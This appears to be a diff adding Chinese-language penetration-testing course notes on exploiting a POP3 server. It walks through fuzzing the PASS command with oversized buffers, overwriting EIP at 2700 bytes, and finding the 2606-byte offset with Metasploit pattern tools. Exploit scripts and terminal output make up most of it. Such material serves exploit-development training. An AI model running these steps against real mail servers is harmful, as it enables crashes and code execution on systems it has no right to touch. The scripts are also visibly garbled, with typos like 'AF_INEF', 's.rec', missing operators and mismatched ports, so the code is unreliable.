@@ -1,0 +1,180 @@
+课时40 POP3
+
+╋━━━━━━━━╋
+┃POP3            ┃
+┃NC 110端口      ┃
+┃了解未知协议    ┃
+┃    wireshark   ┃
+┃    RFC         ┃
+┃01.py           ┃
+╋━━━━━━━━╋
+
+root@kali:~# nc 192.168.1.119 110
++OK POP3 server lab.com ready <00003.1700925@lab.com>
+USER test
++OK test welcome here
+pass aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+-ERR unable to lock mailbox
+
+╭────────────────────────────────────────────╮
+[01.py]
+#!/usr/bin/python
+import socket
+s = socket.socket(socket.AF_INEF.socket.SOCK_STREAM)
+try:
+    print "\nSending evil buffer..."
+    s.connect(('192.168.20.32',110))
+    data = s.recv(1024)
+    print data
+
+    s.send('USER yuanfu'+'\r\n')
+    data = s.rec(1024)
+    print data
+
+    s.send('PASS test\r\n')
+    data = s.recv(1024)
+    print data
+
+    s.close()
+    print "\nDone!"
+
+except:
+    print "Could not connect to POP3!"
+╰────────────────────────────────────────────╯
+
+root@kali:~# ./01.py
+
+Sending evil buffer
+
++OK POP3 server lab.com ready <00003.1700925@lab.com>
+
++OK yuanfu welcome here
+
+-ERR invalid password
+
+
+Done!
+
+╋━━━━━━━━━━━━━━━━━━━━╋
+┃FUZZING                                 ┃
+┃测试PASS命令接收到大量数据时是否会溢出  ┃
+┃EIP寄存器存放下一条指令的地址           ┃
+┃02.py                                   ┃
+╋━━━━━━━━━━━━━━━━━━━━╋
+
+╭────────────────────────────────────────────╮
+[02.py]
+#!/usr/bin/python
+import socket
+
+buffer=["A"]
+counter=100
+while len(buffer) <= 30：
+    buffer.append("A"*counter)
+    counter=counter+200
+
+for string in buffer:
+    print "Fuzzing PASS with %s bytes" % len(string)
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    connect = s.connect(('192.168.20.32',100))
+    s.recv(1024)
+    s.send('USER test'+'\r\n')
+    s.recv(1024)
+    s.send('PASS' + string + '\r\n')
+    s.send('QUIT\r\n')
+    s.close()
+╰────────────────────────────────────────────╯
+
+root@kali:~# ./02 .py
+Fuzzing PASS with 1 bytes
+Fuzzing PASS with 100 bytes
+Fuzzing PASS with 300 bytes
+Fuzzing PASS with 500 bytes
+Fuzzing PASS with 700 bytes
+Fuzzing PASS with 900 bytes
+Fuzzing PASS with 1100 bytes
+Fuzzing PASS with 100 bytes
+Fuzzing PASS with 1300 bytes
+Fuzzing PASS with 1500 bytes
+Fuzzing PASS with 1700 bytes
+Fuzzing PASS with 1900 bytes
+Fuzzing PASS with 2100 bytes
+Fuzzing PASS with 2300 bytes
+Fuzzing PASS with 2500 bytes
+Fuzzing PASS with 2700 bytes
+Fuzzing PASS with 2900 bytes
+Fuzzing PASS with 3100 bytes
+Traceback (most recent call last):
+  File "./02.py", line 13, in <module>
+    connect = s.connect(('192.168.1.119',110))
+  File "/usr/lib/python2.7/socket.py", line 224, in meth
+    return getattr(self._sock,name)(*args)
+socket.error: [Errno 111] Connection refused
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃FUZZING                                                       ┃
+┃2700个字符实现EIP寄存器溢出                                   ┃
+┃03.py                                                         ┃
+┃找到精确溢出的4个字节                                         ┃
+┃    二分法                                                    ┃
+┃    唯一字串法                                                ┃
+┃    usr/share/metasloit-framework/tools/pattern_create.rb 2700┃
+┃    04.py                                                     ┃
+┃    05.py                                                     ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+
+╭────────────────────────────────────────────╮
+[03.py]
+#!/usr/bin/python
+import socket
+
+s = socket.socket(socket.AF_INEF.socket.SOCK_STREAM)
+buffer = "A" * 2700
+try:
+    print "\nSending evil buffer..."
+    s.connect(('192.168.20.32',110))
+    data = s.recv(1024)
+    s.send('USER test'+'\r\n')
+    data = s.rec(1024)
+    s.send('PASS' + buffer 'test\r\n')
+    print "\nDone!"
+except:
+    print "Could not connect to POP3!"
+╰────────────────────────────────────────────╯
+
+root@kali:~# ./03.py
+
+Sending evil buffer
+
+
+Done!
+
+root@kali:~# cd usr/share/metasloit-framework/tools
+
+root@kali:usr/share/metasloit-framework/tools# ./pattern_create.rb 2700
+
+root@kali:usr/share/metasloit-framework/tools# ./pattern_create.rb 39694438
+[*] Exact match at offset 2606
+
+root@kali:usr/share/metasloit-framework/tools# 8Di9
+
+╭────────────────────────────────────────────╮
+[05.py]
+#!/usr/bin/python
+import socket
+
+s = socket.socket(socket.AF_INEF.socket.SOCK_STREAM)
+buffer = "A" * 2606+"b"*4+"c"*20
+try:
+    print "\nSending evil buffer..."
+    s.connect(('192.168.20.32',110))
+    data = s.recv(1024)
+    s.send('USER test'+'\r\n')
+    data = s.rec(1024)
+    s.send('PASS' + buffer 'test\r\n')
+    print "\nDone!"
+except:
+    print "Could not connect to POP3!"
+╰────────────────────────────────────────────╯
+
